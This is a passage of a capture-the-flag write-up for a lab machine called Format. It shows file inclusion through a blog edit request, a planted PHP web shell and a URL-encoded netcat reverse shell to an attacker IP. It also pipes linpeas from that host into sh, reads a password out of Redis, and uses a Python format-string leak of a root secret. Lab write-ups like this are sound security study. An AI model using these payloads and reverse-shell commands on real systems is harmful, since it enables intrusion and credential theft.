+        return "\"" . ucfirst(strval($firstName)) . "\"";
+    }
+}
+
+function fetchPage() {
+    chdir(getcwd() . "/content");
+    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
+    $html_content = "";
+    foreach($order as $line) {
+        $temp = $html_content;
+        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
+    }
+    return $html_content;
+}
+
+?>
+<!DOCTYPE html>
+<head>
+<link rel="icon" type="image/x-icon" href="/images/brain.ico">
+<link rel="stylesheet" href="http://microblog.htb/static/css/styles.css">
+<script src="http://microblog.htb/static/js/jquery.js"></script>
+<title></title>
+<script>
+    $(window).on('load', function(){
+        const html = <?php echo json_encode(fetchPage()); ?>.replace(/(\r\n|\n|\r)/gm, "");
+        $(".push-for-h1").after(html);
+        if(html.length === 0) {
+            $(".your-blog").after("<div class = \"empty-blog\">Blog in progress... check back soon!</div>");
+            $(".push-for-h1").css("display", "none");
+        }
+        const siteOwner = <?php echo json_encode(checkOwner()); ?>;
+        if(siteOwner.length > 0) {
+            $(".your-blog").css("display", "flex");
+            $(".user-first-name").text(<?php echo getFirstName(); ?>);
+        }
+        const class_after_push = $(".push-for-h1").next().children().attr('class');
+        if(class_after_push) {
+            if(class_after_push.includes("blog-h1")) {
+                $(".push-for-h1").css("display", "none");
+            }
+        }
+
+        const blogName = String(window.location).split('.')[0].split('//')[1]
+        document.title = blogName + " - Microblog"
+    });
+</script>
+</head>
+<body>
+    <div class = "your-blog">
+        <div><span class = "user-first-name"></span>, this is your blog! <a href = "/edit" style = "color: white;"><b>Edit it here.</b></a></div>
+    </div>
+    <div class = "push-for-h1" style = "min-height: 25px;"></div>
+    <footer>
+        © 2022 Microblog<br/>
+        <a href="https://www.vecteezy.com/free-vector/brain">Brain Vectors by Vecteezy</a>
+    </footer>
+</body>
+</html>
diff --git a/bucket/css/health.txt b/microbucket/css/health.txt
similarity index 100%
rename from bucket/css/health.txt
rename to microbucket/css/health.txt
diff --git a/bucket/css/styles.css b/microbucket/css/styles.css
similarity index 99%
rename from bucket/css/styles.css
rename to microbucket/css/styles.css
index 2e5b80b..9e41ed7 100644
--- a/bucket/css/styles.css
+++ b/microbucket/css/styles.css
@@ -502,7 +502,6 @@ body.dashboard {
 
 .blog-text {
        margin: 0px 50px 25px 50px;
-       white-space: pre;
 }
 
 .blog-image {
@@ -639,7 +638,7 @@ body.dashboard {
        padding: 15px 0px;
        font-weight: bold;
        display: inline-block;
-       width: 39%;
+       width: 38.9%;
 }
   
 #file-chosen{
@@ -674,4 +673,4 @@ body.dashboard {
 
 .delete-button:hover {
        cursor: pointer;
-}
\ No newline at end of file
+}
diff --git a/bucket/js/fontawesome.js b/microbucket/js/fontawesome.js
similarity index 100%
rename from bucket/js/fontawesome.js
rename to microbucket/js/fontawesome.js
diff --git a/bucket/js/health.txt b/microbucket/js/health.txt
similarity index 100%
rename from bucket/js/health.txt
rename to microbucket/js/health.txt
diff --git a/bucket/js/jquery.js b/microbucket/js/jquery.js
similarity index 100%
rename from bucket/js/jquery.js
rename to microbucket/js/jquery.js
diff --git a/bucket/js/typed.js b/microbucket/js/typed.js
similarity index 100%
rename from bucket/js/typed.js
rename to microbucket/js/typed.js
```

```c
$ tree
.
├── html
│   └── index.html
├── microblog
│   ├── app
│   │   ├── brain.ico
│   │   ├── brain.png
│   │   ├── dashboard
│   │   │   └── index.php
│   │   ├── index.php
│   │   ├── login
│   │   │   └── index.php
│   │   ├── logout
│   │   │   └── index.php
│   │   └── register
│   │       └── index.php
│   └── sunny
│       ├── content
│       │   ├── 2766wxkoacy
│       │   ├── jtdpx1iea5
│       │   ├── order.txt
│       │   ├── rle1v1hnms
│       │   └── syubx3wiu3e
│       ├── edit
│       │   └── index.php
│       ├── images
│       │   └── brain.ico
│       └── index.php
├── microblog-template
│   ├── content
│   │   └── order.txt
│   ├── edit
│   │   └── index.php
│   ├── images
│   │   └── brain.ico
│   └── index.php
├── microbucket
│   ├── css
│   │   ├── health.txt
│   │   └── styles.css
│   └── js
│       ├── fontawesome.js
│       ├── health.txt
│       ├── jquery.js
│       └── typed.js
├── pro-files
│   └── bulletproof.php
└── README.md

20 directories, 28 files
```

### Local File Inclusion (LFI) through Blog Edit Function

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.186.151  microblog.htb
10.129.186.151  app.microblog.htb
10.129.186.151  sunny.microblog.htb
10.129.186.151  foobar.microblog.htb
```

We found a vulnerable function which allowed us to read files on the system.

```c
+function fetchPage() {
+    chdir(getcwd() . "/../content");
+    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
+    $html_content = "";
+    foreach($order as $line) {
+        $temp = $html_content;
+        $html_content = $temp . "<div class = \"{$line} blog-indiv-content\">" . file_get_contents($line) . "</div>";
+    }
+    return $html_content;
+}
```

We edited our blog, selected `txt` and intercepted the request with `Burp Suite`.

Request:

```c
POST /edit/index.php HTTP/1.1
Host: foobar.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://foobar.microblog.htb
DNT: 1
Connection: close
Referer: http://foobar.microblog.htb/edit/
Cookie: username=7q8galc6f4qemb1t021bqo3riu
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

id=sd5ju4g7lg&txt=%2Fetc%2Fpasswd
```

Modified Request:

```c
POST /edit/index.php HTTP/1.1
Host: foobar.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://foobar.microblog.htb
DNT: 1
Connection: close
Referer: http://foobar.microblog.htb/edit/
Cookie: username=7q8galc6f4qemb1t021bqo3riu
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

id=/etc/passwd&txt=%2Fetc%2Fpasswd
```

Output:

```c
HTTP/1.1 302 Found
Server: nginx/1.18.0
Date: Sat, 13 May 2023 19:48:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /edit?message=Section added!&status=success
Content-Length: 8755

<!DOCTYPE html>
<head>
<link rel="icon" type="image/x-icon" href="/images/brain.ico">
<link rel="stylesheet" href="http://microblog.htb/static/css/styles.css">
<script src="http://microblog.htb/static/js/jquery.js"></script>
<script src="http://microblog.htb/static/js/fontawesome.js"></script>
<title></title>
<script>
    $(window).on('load', function(){
        const queryString = window.location.search;
        if(queryString) {
            const urlParams = new URLSearchParams(queryString);
            if(urlParams.get('message') && urlParams.get('status')) {
                const status = urlParams.get('status')
                const message = urlParams.get('message')
                $(".floating-message").css("display", "block");
                $(".floating-message").children(".message-content").text(message);
                if(status === "fail") {
                    $(".floating-message").css("background-color", "#AF0606");
                }
                else {
                    $(".floating-message").css("background-color", "#4BB543");
                }
            }
        }
        const pro = false;
        if(!pro) {
            $(".pro").css("display", "none");
            $("#img-dot").css("display", "none");
        }
        const html = "<div class = \"\/etc\/passwd blog-indiv-content\">root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:100:65534::\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:\/run\/systemd:\/usr\/sbin\/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:\/run\/systemd:\/usr\/sbin\/nologin\nsystemd-timesync:x:999:999:systemd Time Synchronization:\/:\/usr\/sbin\/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:\/:\/usr\/sbin\/nologin\ncooper:x:1000:1000::\/home\/cooper:\/bin\/bash\nredis:x:103:33::\/var\/lib\/redis:\/usr\/sbin\/nologin\ngit:x:104:111:Git Version Control,,,:\/home\/git:\/bin\/bash\nmessagebus:x:105:112::\/nonexistent:\/usr\/sbin\/nologin\nsshd:x:106:65534::\/run\/sshd:\/usr\/sbin\/nologin\n_laurel:x:997:997::\/var\/log\/laurel:\/bin\/false\n<\/div>".replace(/(\r\n|\n|\r)/gm, "");
```

| Username |
| --- |
| git |
| cooper |

### Further Enumeration

```c
POST /edit/index.php HTTP/1.1
Host: foobar.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: http://foobar.microblog.htb
DNT: 1
Connection: close
Referer: http://foobar.microblog.htb/edit/
Cookie: username=7q8galc6f4qemb1t021bqo3riu
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

id=/etc/nginx/sites-available/default&txt=foobar
```

```c
"<div class = \"\/etc\/nginx\/sites-available\/default blog-indiv-content\">##\n# You should look at the following URL's in order to grasp a solid understanding\n# of Nginx configuration files in order to fully unleash the power of Nginx.\n# https:\/\/www.nginx.com\/resources\/wiki\/start\/\n# https:\/\/www.nginx.com\/resources\/wiki\/start\/topics\/tutorials\/config_pitfalls\/\n# https:\/\/wiki.debian.org\/Nginx\/DirectoryStructure\n#\n# In most cases, administrators will remove this file from sites-enabled\/ and\n# leave it as reference inside of sites-available where it will continue to be\n# updated by the nginx packaging team.\n#\n# This file will automatically load configuration files provided by other\n# applications, such as Drupal or Wordpress. These applications will be made\n# available underneath a path with that package name, such as \/drupal8.\n#\n# Please see \/usr\/share\/doc\/nginx-doc\/examples\/ for more detailed examples.\n##\n\n# Default server configuration\n#\nserver {\n\tlisten 80 default_server;\n\tlisten [::]:80 default_server;\n\n\t# SSL configuration\n\t#\n\t# listen 443 ssl default_server;\n\t# listen [::]:443 ssl default_server;\n\t#\n\t# Note: You should disable gzip for SSL traffic.\n\t# See: https:\/\/bugs.debian.org\/773332\n\t#\n\t# Read up on ssl_ciphers to ensure a secure configuration.\n\t# See: https:\/\/bugs.debian.org\/765782\n\t#\n\t# Self signed certs generated by the ssl-cert package\n\t# Don't use them in a production server!\n\t#\n\t# include snippets\/snakeoil.conf;\n\n\troot \/var\/www\/html;\n\n\t# Add index.php to the list if you are using PHP\n\tindex index.html index.htm index.nginx-debian.html;\n\n\tserver_name _;\n\n\tlocation \/ {\n\t\t# First attempt to serve request as file, then\n\t\t# as directory, then fall back to displaying a 404.\n\t\ttry_files $uri $uri\/ =404;\n\t}\n\n\t# pass PHP scripts to FastCGI server\n\t#\n\t#location ~ \\.php$ {\n\t#\tinclude snippets\/fastcgi-php.conf;\n\t#\n\t#\t# With php-fpm (or other unix sockets):\n\t#\tfastcgi_pass unix:\/run\/php\/php7.4-fpm.sock;\n\t#\t# With php-cgi (or other tcp sockets):\n\t#\tfastcgi_pass 127.0.0.1:9000;\n\t#}\n\n\t# deny access to .htaccess files, if Apache's document root\n\t# concurs with nginx's one\n\t#\n\t#location ~ \/\\.ht {\n\t#\tdeny all;\n\t#}\n}\n\nserver {\n\tlisten 80;\n\tlisten [::]:80;\n\n\troot \/var\/www\/microblog\/app;\n\n\tindex index.html index.htm index-nginx-debian.html;\n\n\tserver_name microblog.htb;\n\n\tlocation \/ {\n\t\treturn 404;\n\t}\n\n\tlocation = \/static\/css\/health\/ {\n\t\tresolver 127.0.0.1;\n\t\tproxy_pass http:\/\/css.microbucket.htb\/health.txt;\n\t}\n\n\tlocation = \/static\/js\/health\/ {\n\t\tresolver 127.0.0.1;\n\t\tproxy_pass http:\/\/js.microbucket.htb\/health.txt;\n\t}\n\n\tlocation ~ \/static\/(.*)\/(.*) {\n\t\tresolver 127.0.0.1;\n\t\tproxy_pass http:\/\/$1.microbucket.htb\/$2;\n\t}\n}\n<\/div>".replace(/(\r\n|\n|\r)/gm, "");
```

| Path |
| --- |
| /var/www/microblog/app |

### Foothold

We edited `h1` and inserted our `url encoded` payload.

Payload:

```c
id=/var/www/microblog/foobar/content/shell.php&header=<?php+system($_GET['cmd']);+?>
```

URL encoded Payload:

```c
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%33%39%20%39%30%30%31%20%3e%2f%74%6d%70%2f%66
```

Modified Request:

```c
POST /edit/index.php HTTP/1.1
Host: foobar.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://foobar.microblog.htb
DNT: 1
Connection: close
Referer: http://foobar.microblog.htb/edit/?message=Section%20deleted&status=success
Cookie: username=7q8galc6f4qemb1t021bqo3riu
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

id=/var/www/microblog/foobar/content/shell.php&header=<?php+system($_GET['cmd']);+?>
```

Trigger:

> http://foobar.microblog.htb/content/shell.php/shell.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%33%39%20%39%30%30%31%20%3e%2f%74%6d%70%2f%66

```c
 nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.39] from (UNKNOWN) [10.129.186.151] 38690
bash: cannot set terminal process group (599): Inappropriate ioctl for device
bash: no job control in this shell
www-data@format:~/microblog/foobar/content$
```

### Stable Shell

```c
$ bash
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.39] from (UNKNOWN) [10.129.186.151] 46510
bash: cannot set terminal process group (599): Inappropriate ioctl for device
bash: no job control in this shell
www-data@format:~/microblog/foobar/content$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ent$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@format:~/microblog/foobar/content$ ^Z
[1]+  Stopped                 nc -lnvp 9001
```

```c
$ stty raw -echo
```

```c
$ 
nc -lnvp 9001

www-data@format:~/microblog/foobar/content$ 
www-data@format:~/microblog/foobar/content$ export XTERM=xterm
www-data@format:~/microblog/foobar/content$
```

## Enumeration

```c
www-data@format:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
cooper:x:1000:1000::/home/cooper:/bin/bash
redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

### LinPEAS

```c
www-data@format:/dev/shm$ curl http://10.10.16.39/linpeas.sh | sh
```

```c
╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/dbus/system_bus_socket                                                                                                                                                                                                                 
  └─(Read Write)
/run/php/php7.4-fpm.sock
  └─(Read Write)
/run/redis/redis.sock
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/redis/redis.sock
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)
```

## Grabbing Password from Redis Database

```c
www-data@format:/dev/shm$ redis-cli -s /run/redis/redis.sock
redis /run/redis/redis.sock>
```

```c
redis /run/redis/redis.sock> INFO keyspace
# Keyspace
db0:keys=5,expires=1,avg_ttl=1183836
```

```c
redis /run/redis/redis.sock> KEYS *
1) "cooper.dooper"
2) "cooper.dooper:sites"
```

```c
redis /run/redis/redis.sock> TYPE cooper.dooper
hash
```

```c
redis /run/redis/redis.sock> HKEYS cooper.dooper
1) "username"
2) "password"
3) "first-name"
4) "last-name"
5) "pro"
```

```c
redis /run/redis/redis.sock> HGET cooper.dooper password
"zooperdoopercooper"
```

| Username | Password |
| --- | --- |
| cooper | zooperdoopercooper |

```c
$ ssh cooper@microblog.htb
The authenticity of host 'microblog.htb (10.129.186.151)' can't be established.
ED25519 key fingerprint is SHA256:30cTQN6W3DKQMMwb5RGQA6Ie1hnKQ37/bSbe+vpYE98.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:357: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'microblog.htb' (ED25519) to the list of known hosts.
cooper@microblog.htb's password: 
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cooper@format:~$
```

## user.txt

```c
cooper@format:~$ cat user.txt 
af38131357d624dc782872a8a257e86b
```

## Pivoting

```c
cooper@format:~$ id
uid=1000(cooper) gid=1000(cooper) groups=1000(cooper)
```

```c
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

```c
cooper@format:~$ sudo /usr/bin/license
[sudo] password for cooper: 
usage: license [-h] (-p username | -d username | -c license_key)
license: error: one of the arguments -p/--provision -d/--deprovision -c/--check is required
```

## Investigating the Binary

```c
cooper@format:~$ strings /usr/bin/license
#!/usr/bin/python3
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()
if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()
parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
f = Fernet(encryption_key)
l = License()
#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")
#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()
#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

Explanation:

```c
#!/usr/bin/python3

# import necessary libraries
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

# define a License class with a randomly generated license key and today's date
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

# check if script is running as root; exit if not
if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

# create an argument parser and define required arguments
parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

# connect to Redis database
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

# read in secret from file and encode it
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()

# generate a salt and use it to derive an encryption key from the secret
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

# create a Fernet instance using the encryption key
f = Fernet(encryption_key)

# create a License instance
l = License()

# provision a license key if -p flag is specified
if(args.provision):
    # get user profile from Redis database
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        # exit if user does not exist
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    # open file containing existing license keys
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        # check if license key has already been provisioned for this user
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    # create license key using user information and License instance
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    # print plaintext and encrypted license key
    print("")
    print("
```

## Leaking Global Variables

ChatGPT found a vulnerability in the `.format()` function.

```c
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

> https://podalirius.net/en/articles/python-format-string-vulnerabilities/

```c
secret = [line.strip() for line in open("/root/license/secret")][0]
```

`AROx4444` and `xvt` brought it home.

```c
redis /var/run/redis/redis.sock> HSET test username "{license.__init__.__globals__}"
(integer) 1
redis /var/run/redis/redis.sock> HSET test first-name test
(integer) 1
redis /var/run/redis/redis.sock> HSET test last-name test
(integer) 1
```

```c
cooper@format:/dev/shm$ sudo /usr/bin/license -p test

Plaintext license key:
------------------------------------------------------
microblog{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fc837108c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/bin/license', '__cached__': None, 'base64': <module 'base64' from '/usr/lib/python3.9/base64.py'>, 'default_backend': <function default_backend at 0x7fc836f5b430>, 'hashes': <module 'cryptography.hazmat.primitives.hashes' from '/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py'>, 'PBKDF2HMAC': <class 'cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC'>, 'Fernet': <class 'cryptography.fernet.Fernet'>, 'random': <module 'random' from '/usr/lib/python3.9/random.py'>, 'string': <module 'string' from '/usr/lib/python3.9/string.py'>, 'date': <class 'datetime.date'>, 'redis': <module 'redis' from '/usr/local/lib/python3.9/dist-packages/redis/__init__.py'>, 'argparse': <module 'argparse' from '/usr/lib/python3.9/argparse.py'>, 'os': <module 'os' from '/usr/lib/python3.9/os.py'>, 'sys': <module 'sys' (built-in)>, 'License': <class '__main__.License'>, 'parser': ArgumentParser(prog='license', usage=None, description='Microblog license key manager', formatter_class=<class 'argparse.HelpFormatter'>, conflict_handler='error', add_help=True), 'group': <argparse._MutuallyExclusiveGroup object at 0x7fc835b017c0>, 'args': Namespace(provision='test', deprovision=None, check=None), 'r': Redis<ConnectionPool<UnixDomainSocketConnection<path=/var/run/redis/redis.sock,db=0>>>, '__warningregistry__': {'version': 0}, 'secret': 'unCR4ckaBL3Pa$$w0rd', 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd', 'salt': b'microblogsalt123', 'kdf': <cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC object at 0x7fc835b01e50>, 'encryption_key': b'nTXlHnzf-z2cR0ADCHOrYga7--k6Ii6BTUKhwmTHOjU=', 'f': <cryptography.fernet.Fernet object at 0x7fc835b265e0>, 'l': <__main__.License object at 0x7fc835b266d0>, 'user_profile': {b'username': b'{license.__init__.__globals__}', b'first-name': b'test', b'last-name': b'test'}, 'existing_keys': <_io.TextIOWrapper name='/root/license/keys' mode='r' encoding='UTF-8'>, 'all_keys': ['cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n'], 'user_key': 